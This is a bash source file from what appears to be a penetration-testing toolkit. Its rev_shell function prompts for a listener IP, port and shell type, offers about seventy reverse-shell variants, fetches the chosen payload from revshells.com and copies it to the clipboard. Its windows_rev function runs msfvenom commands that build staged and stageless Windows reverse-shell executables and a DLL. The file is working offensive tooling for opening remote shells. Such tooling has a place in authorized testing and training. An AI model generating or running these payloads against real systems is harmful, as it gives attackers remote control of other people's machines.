#!/bin/bash


# Usage: rev_shell
# TODO: Doc
# TODO: built-in encode
# TODO: env default port
# TODO: list options for shell type
# TODO: fix revshell issue on 42 (Powershell base64)
# Category: [ rce ]
function rev_shell() {
    swiss_logger prompt "[i] Enter IP (Default: $(_get_default_network_interface_ip)): \c"
    read -r IP
    local IP=${IP:-$(_get_default_network_interface_ip)}

    swiss_logger prompt "[i] Port (Default: 9000): \c"
    read -r PORT
    local PORT=${PORT:-9000}

    local -a allowed_shell_types=("sh" "/bin/sh" "bash" "/bin/bash" "cmd" "powershell" "pwsh" "ash" "bsh" "csh" "ksh" "zsh" "pdksh" "tcsh" "mksh" "dash")

    function is_valid_shell_type() {
        local shell="$1"
        for valid_shell in "${allowed_shell_types[@]}"; do
            if [[ "$shell" == "$valid_shell" ]]; then
                return 0
            fi
        done
        return 1
    }

    while true; do
        swiss_logger prompt "[i] supported shell type: $allowed_shell_types"
        swiss_logger prompt "[i] Enter Shell (Default: /bin/bash): \c"
        read -r SHELL_TYPE
        SHELL_TYPE=${SHELL_TYPE:-"/bin/bash"}

        if is_valid_shell_type "$SHELL_TYPE"; then
            break
        else
            swiss_logger error "[e] Invalid SHELL_TYPE. Allowed values are: ${allowed_shell_types[*]}"
        fi
    done

    # stripping color
    swiss_logger info ""

    local PS3="Please select the Mode (number): "
    local -a bash_options=( "Bash -i" "Bash 196" "Bash read line" "Bash 5" "Bash udp" "nc mkfifo" "nc -e" "nc.exe -e" "BusyBox nc -e" "nc -c" "ncat -e" "ncat.exe -e" "ncat udp" "curl" "rustcat" "C" "C Windows" "C# TCP Client" "C# Bash -i" "Haskell #1" "OpenSSL" "Perl" "Perl no sh" "Perl PentestMonkey" "PHP PentestMonkey" "PHP Ivan Sincek" "PHP cmd" "PHP cmd 2" "PHP cmd small" "PHP exec" "PHP shell_exec" "PHP system" "PHP passthru" "PHP \`" "PHP popen" "PHP proc_open" "Windows ConPty" "PowerShell #1" "PowerShell #2" "PowerShell #3" "PowerShell #4 (TLS)" "PowerShell #3 (Base64)" "Python #1" "Python #2" "Python3 #1" "Python3 #2" "Python3 Windows" "Python3 shortest" "Ruby #1" "Ruby no sh" "socat #1" "socat #2 (TTY)" "sqlite3 nc mkfifo" "node.js" "node.js #2" "Java #1" "Java #2" "Java #3" "Java Web" "Java Two Way" "Javascript" "Groovy" "telnet" "zsh" "Lua #1" "Lua #2" "Golang" "Vlang" "Awk" "Dart" "Crystal (system)" "Crystal (code)")

    local MODE
    select MODE in "${bash_options[@]}"; do
      if [[ -n "$MODE" ]]; then
        swiss_logger info "[i] Mode $MODE selected."
        local ENCODED_MODE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$MODE'''))")
        break
      else
        swiss_logger error "[e] Invalid selection, please try again."
      fi
    done

    local ENCODED_SHELL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$SHELL_TYPE'''))")
    local URL="https://www.revshells.com/${ENCODED_MODE}?ip=${IP}&port=${PORT}&shell=${ENCODED_SHELL}"

    swiss_logger debug "[d] Request=$URL"
    local HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${URL}")

    if [[ "$HTTP_STATUS" -eq 200 ]]; then
        curl -s "${URL}" | xclip -selection clipboard
        swiss_logger info "[i] payload copied."
    else
        swiss_logger error "[e] Status $HTTP_STATUS"
    fi
}

# TODO: Doc
# Category: [ func:rce, func:pe ]
function msfsearch() {
    msfconsole -q -x "search $@; exit"
}

# Description: Generate a reverse shell using msfvenom
# Usage: windows_rev <-p PORT> <-a x86|x64|dll> [-i IP]
# Arguments:
#   -p|--port:      Port number for the reverse shell
#   -a|--arch:      Architecture for the reverse shell (x86, x64, dll)
#     -i|--ip:      IP address for the reverse shell
# Example:
#   windows_rev -p 4444 -a x86
# Category: [ rce, windows]
# References:
#   - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
#   - https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/shell_and_some_payloads.md
# TODO: extends to Linux
function windows_rev() {
    local ip=$(_get_default_network_interface_ip)
    local port="$_swiss_windows_rev_default_port"
    local arch="$_swiss_windows_rev_default_arch"
    local generate_stage=$_swiss_windows_rev_generate_stage
    local generate_stageless=$_swiss_windows_rev_generate_stageless

    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--ip)
                ip="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -a|--arch)
                arch="$2"
                shift 2
                ;;
            -h|--help)
                _help
                return 0
                ;;
            *)
                swiss_logger error "[e] Invalid option: $1. Check with -h, --help"
                return 1
                ;;
        esac
    done

    if [[ -z "$port" || -z "$arch" || -z "$ip" ]]; then
        swiss_logger error "[e] Port, IP, and architecture must be specified"
        swiss_logger
        return 1
    fi

    case $arch in
        x86)
            if [[ $generate_stage = true ]]; then
                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stage.exe
            fi

            if [[ $generate_stageless = true ]]; then
                msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stageless.exe
            fi
            ;;
        x64)
            if [[ $generate_stage = true ]]; then
                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stage.exe
            fi

            if [[ $generate_stageless = true ]]; then
                msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stageless.exe
            fi
            ;;
        dll)
            msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o reverse.dll
            ;;
        *)
            swiss_logger error "[e] Invalid architecture: $arch. Only x86, x64, and dll are supported."
            return 1
            ;;
    esac
}